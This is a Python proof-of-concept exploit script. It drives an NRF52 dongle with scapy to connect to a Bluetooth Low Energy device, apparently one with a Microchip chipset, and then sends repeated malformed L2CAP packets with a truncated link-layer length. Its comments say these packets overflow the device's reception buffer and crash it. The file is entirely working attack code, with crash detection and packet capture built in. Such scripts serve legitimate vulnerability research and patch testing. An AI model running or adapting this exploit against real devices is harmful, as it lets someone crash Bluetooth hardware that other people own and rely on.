#!/usr/bin/python 
import os
import platform
import sys
from time import sleep

# libs
sys.path.insert(0, os.getcwd() + '/libs')
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from scapy.layers.bluetooth import *
# timeout lib
from timeout_lib import start_timeout, update_timeout

# Default master address
master_address = '5d:36:ac:90:0b:22'
access_address = 0x9a328370
# Internal vars
none_count = 0
end_connection = False
connecting = False
slave_addr_type = 0
CRASH_TIMEOUT = 5
slave_ever_connected = False
# Autoreset colors
colorama.init(autoreset=True)

# Get serial port from command line
if len(sys.argv) >= 2:
    serial_port = sys.argv[1]
elif platform.system() == 'Linux':
    serial_port = '/dev/ttyACM0'
elif platform.system() == 'Windows':
    serial_port = 'COM1'
else:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 3:
    advertiser_address = sys.argv[2].upper()
else:
    advertiser_address = 'f8:f0:05:f3:66:e0'.upper()

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())


def crash_timeout():
    global slave_ever_connected
    if slave_ever_connected == True:
        print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
              ' received\nThe device may have crashed!!!')
        driver.save_pcap()
    start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)


def scan_timeout():
    global connecting, end_connection, slave_addr_type
    connecting = False
    end_connection = False
    scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
        ScanA=master_address,
        AdvA=advertiser_address)
    driver.send(scan_req)
    start_timeout('scan_timeout', 3, scan_timeout)


# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename='logs/Microchip_invalid_lcap_fragment.pcap')
# Send scan request
scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
driver.send(scan_req)

start_timeout('scan_timeout', 3, scan_timeout)
start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)

print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)

att_start_address = 0x0001

connection_idle_counter = 0

while True:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
            update_timeout('scan_timeout')
            update_timeout('crash_timeout')
            # Print slave data channel PDUs summary
            print(Fore.MAGENTA + "RX <--- " + pkt.summary()[7:])
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == advertiser_address.lower() and connecting == False:
            connecting = True
            update_timeout('scan_timeout')
            update_timeout('crash_timeout')
            slave_addr_type = pkt.TxAdd

            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
            # Send connection request to advertiser
            conn_request = BTLE() / BTLE_ADV(RxAdd=slave_addr_type, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=1,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms (any)
                chM=0x1FFFFFFFFF,  # Any
                hop=5,  # Hop increment (any)
                SCA=0,  # Clock tolerance
            )
            # Yes, we're sending raw link layer messages in Python.
            # Don't tell Bluetooth SIG as this is forbidden (for some reason)!!!
            driver.send(conn_request)

        elif BTLE_DATA in pkt and connecting == True:
            connecting = False
            slave_ever_connected = True
            att_start_address = 0
            print(Fore.GREEN + 'Slave Connected (L2Cap channel established)')
            # 1) Send Feature request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ(
                feature_set='le_encryption+le_data_len_ext')
            driver.send(pkt)
        # 2) Receive Feature response
        elif LL_FEATURE_RSP in pkt:
            # Send version indication request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
            driver.send(pkt)


        elif LL_LENGTH_RSP in pkt or LL_UNKNOWN_RSP in pkt:
            pkt = BTLE(access_addr=access_address) / \
                  BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Exchange_MTU_Request(mtu=247)
            driver.send(pkt)


        elif ATT_Exchange_MTU_Response in pkt:
            pkt = BTLE(access_addr=access_address) / \
                  BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
            driver.send(pkt)


        elif LL_VERSION_IND in pkt:
            pkt = BTLE(access_addr=access_address) / \
                  BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Read_By_Group_Type_Request(start=0x0001, end=0xffff,
                                                                                         uuid=0x2800)
            att_start_address = 0x0023  # Jump to next att request
            driver.send(pkt)  # Send the malicius packet (1/2)


        elif ATT_Read_By_Group_Type_Response in pkt:
            # Increment start address until we get a ATT_Error_Response
            att_start_address += 1
            pkt = BTLE(access_addr=access_address) / \
                  BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Read_By_Group_Type_Request(start=att_start_address,
                                                                                         end=0xffff, uuid=0x2800)
            driver.send(pkt)  # Send ATT_Read_By_Group_Type_Request


        elif ATT_Error_Response in pkt:
            pkt = BTLE(access_addr=access_address) / \
                  BTLE_DATA() / L2CAP_Hdr(
                len=0x20)  # L2cap lengths above 6-7 in combination with the lower link layer length seems to overflow the L2cap reception buffer
            # Truncate the packet to Link Layer Length of 1 (4(access address) + 3(header + PDU) + 3(CRC))
            pkt[
                BTLE].len = 1  # using 1 or 2 here also triggers a overflow. This issue seems to be the inverse of truncated L2cap
            driver.send(pkt)  # Imidiatelly schedule same packet on next connection event
            driver.send(pkt)  # 2 or 3 repeated packets seems enough to crash the device
            driver.send(pkt)  # 2 or 3 repeated packets seems enough to crash the device
            driver.send(pkt)  # 2 or 3 repeated packets seems enough to crash the device
            end_connection = True


        elif end_connection == True:
            connection_idle_counter += 1
            if connection_idle_counter >= 50:
                end_connection = False
                connection_idle_counter = 0
                sleep(1)
                scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
                    ScanA=master_address,
                    AdvA=advertiser_address)
                print(Fore.YELLOW + 'Connection reset, malformed packets were sent')

                print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
                driver.send(scan_req)
                start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)

        if BTLE_DATA in pkt:
            update_timeout('crash_timeout')

    sleep(0.01)
